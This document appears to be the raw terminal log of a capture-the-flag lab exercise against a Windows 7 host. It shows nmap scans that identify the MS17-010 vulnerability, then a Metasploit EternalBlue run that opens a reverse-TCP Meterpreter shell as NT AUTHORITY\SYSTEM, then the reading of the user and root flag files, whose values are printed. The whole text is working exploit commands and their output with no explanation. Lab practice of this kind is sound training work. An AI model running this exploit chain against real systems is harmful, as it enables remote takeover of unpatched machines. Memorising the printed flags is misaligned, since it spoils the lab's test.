```
└──╼ [★]$ nmap -n -Pn --top-ports=1000 -sV -sC --max-retries 0 10.129.100.194
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-23 02:43 CDT
Warning: 10.129.100.194 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.129.100.194
Host is up (0.0082s latency).
Not shown: 928 closed tcp ports (reset), 63 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m09s, deviation: 1s, median: 1m08s
| smb2-time: 
|   date: 2025-03-23T07:46:05
|_  start_date: 2025-03-23T07:42:34
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-23T07:46:04+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.19 seconds
```
```
└─$ nmap -n -Pn --top-ports=1000 -sV --script=vuln  10.129.138.5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 00:43 EDT
Nmap scan report for 10.129.138.5
Host is up (0.34s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.12 seconds
```

```
[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7,
                                              Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Win
                                             dows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embed
                                             ded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     85.9.206.108     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set RHOSTS 10.129.100.194
RHOSTS => 10.129.100.194
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set LHOST tun0
LHOST => 10.10.14.175
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> 
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run
[*] Started reverse TCP handler on 10.10.14.175:4444 
[*] 10.129.100.194:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.100.194:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.100.194:445    - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.100.194:445 - The target is vulnerable.
[*] 10.129.100.194:445 - Connecting to target for exploitation.
[+] 10.129.100.194:445 - Connection established for exploitation.
[+] 10.129.100.194:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.100.194:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.100.194:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.100.194:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.100.194:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.100.194:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.100.194:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.100.194:445 - Sending all but last fragment of exploit packet
[*] 10.129.100.194:445 - Starting non-paged pool grooming
[+] 10.129.100.194:445 - Sending SMBv2 buffers
[+] 10.129.100.194:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.100.194:445 - Sending final SMBv2 buffers.
[*] 10.129.100.194:445 - Sending last fragment of exploit packet!
[*] 10.129.100.194:445 - Receiving response from exploit packet
[+] 10.129.100.194:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.100.194:445 - Sending egg to corrupted connection.
[*] 10.129.100.194:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.129.100.194
[*] Meterpreter session 1 opened (10.10.14.175:4444 -> 10.129.100.194:49158) at 2025-03-23 02:49:13 -0500
[+] 10.129.100.194:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.100.194:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.100.194:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

(Meterpreter 1)(C:\Windows\system32) > 
```
```
(Meterpreter 1)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
(Meterpreter 1)(C:\Windows\system32) > search -f user.txt
Found 1 result...
=================

Path                             Size (bytes)  Modified (UTC)
----                             ------------  --------------
c:\Users\haris\Desktop\user.txt  34            2025-03-23 02:43:14 -0500

(Meterpreter 1)(C:\Windows\system32) > cat "c:\Users\haris\Desktop\user.txt"
a9578e24bedde833fbf2e7e034933f33
(Meterpreter 1)(C:\Windows\system32) > search -f root.txt
Found 1 result...
=================

Path                                     Size (bytes)  Modified (UTC)
----                                     ------------  --------------
c:\Users\Administrator\Desktop\root.txt  34            2025-03-23 02:43:14 -0500

(Meterpreter 1)(C:\Windows\system32) > cat "c:\Users\Administrator\Desktop\root.txt"
cfe7d5a1d3023be8aa3c915d0ca2057a
```
